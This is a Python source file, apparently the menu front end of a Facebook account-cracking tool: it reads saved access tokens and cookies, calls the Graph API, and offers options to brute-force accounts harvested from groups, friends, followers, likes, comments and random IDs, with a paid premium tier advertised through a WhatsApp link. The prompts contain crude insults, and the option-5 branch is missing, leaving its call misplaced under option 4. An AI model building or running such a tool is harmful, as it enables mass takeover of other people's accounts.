
import requests as r, os, sys, json, time, random, subprocess, urllib

from platform import platform
from urllib.error import URLError
from rich import print as prints
from rich.panel import Panel

# ------ MODULE ------ ####
from data import login_key as xx
from data import lainya as xjs
from data import dump as dup
from data import logo as asy
from data import cokz as sx
from data import cek as cpp

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
#---------------------
merah  = '[#FF0022]'
hijau  = '[#00FF33]'
kuning = '[#FFFF00]'
hapus  = '[/]'
biru_m = '[bold cyan]'
warna_rich = random.choice(["[bold red]","[deep_pink3]","[blue]","[green]","[cyan]"])
############################ RESPONSE FACEBOOK ######################################
class Brute:
    def hapus_log(self):
        try:os.remove(".token.txt");os.remove(".cokie.txt")
        except:pass

    def moch_yayan(self):
        asy.Logo().log()
        try:
            tokenz = open(".token.txt", "r").read()
            cookie = {'cookie': open(".cokie.txt", "r").read()}
            get  = r.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(tokenz),cookies=cookie)
            jsx = json.loads(get.text)
            nama = jsx["name"]
        except r.exceptions.ConnectionError:
            print("");prints(Panel("😔[bold red] No connection"));exit()
        except (FileNotFoundError, AttributeError,KeyError):
            print("");prints(Panel("😢[bold red] opshh your victimized account was hit by a checkpoint, please login with another account."));time.sleep(5);self.hapus_log();sx.Login()
        prints(Panel(f"               [{biru_m}+{hapus}] Welcome [yellow]{nama}{hapus} [{biru_m}+{hapus}]"))
        prints(Panel(f"""[{biru_m}01{hapus}]. Crack from Group           [{biru_m}06{hapus}]. Crack from comments
[{biru_m}02{hapus}]. Crack from public friends  [{biru_m}07{hapus}]. Checkpoint detedtor
[{biru_m}03{hapus}]. Crack of total followers   [{biru_m}08{hapus}]. Other features
[{biru_m}04{hapus}]. Crack from like post       [{biru_m}09{hapus}]. Upgrade to [green]premium[/]
[{biru_m}05{hapus}]. Crack from bulk random id  [{biru_m}00{hapus}]. Go out {merah}exit program{hapus}""",title=f'{merah}•{kuning}•{hijau}•{hijau} MENU PILIHAN {hijau}•{kuning}•{merah}•{hapus}'))
        pepek = input(f"  [{O}*{N}] menu : ")
        if pepek in[""," "]:
            print("");prints(Panel("😡[bold red] don't empty kentod"));time.sleep(2);self.moch_yayan()
        elif pepek in["1","01"]:
                dup.Dump().dump_grup(cookie, tokenz)
        elif pepek in["2","02"]:
                dup.Dump().dump_prem(cookie, tokenz)
        elif pepek in["3","03"]:
            
                dup.Dump().followers(cookie, tokenz)
        elif pepek in["4","04"]:
            
                dup.Dump().like_post(cookie)
        
                dup.Dump().rendem(cookie, tokenz)
        elif pepek in["6","06"]:
            
                dup.Dump().komentar(cookie)
        elif pepek in["7","07"]:
            
                cpp.Cek_has()
        elif pepek in["8","08"]:
            xjs.Xnxx(cookie, tokenz)
        elif pepek in["9","09"]:
            print("")
            prints(Panel(f"  >>> Get premium users to enjoy all features!!<<"))
            upd = input("  [?] Do you want to upgrade to premium? [Y/t]: ")
            if upd =="":
                exit(f"  {N}[{M}×{N}] Y/t memek!")
            elif upd in["Y","y"]:
                exit(subprocess.Popen(["am","start","https://wa.me/+8801923554174?text=assalamuaikum .i want to buy license"],stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE).wait())
            elif upd in["T","t"]:
                exit(f"{B}  Good byee:)")
            else:
                exit(f"  {N}[{M}×{N}] Y/t memek!")
        elif pepek in["0","00"]:
            titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
            for x in titik:
                sys.stdout.write(f"\r  [{M}×{N}] delete cookies {N}{x}{N}");sys.stdout.flush()
                time.sleep(1)
            self.hapus_log()
            print("");prints(Panel(f"[{hijau}✓{hapus}] successfully deleted cookies"));exit()
        else:
            print("");prints(Panel(f"😡 memu [bold red]{pepek}[/] no, check the menu!"));time.sleep(2);self.moch_yayan()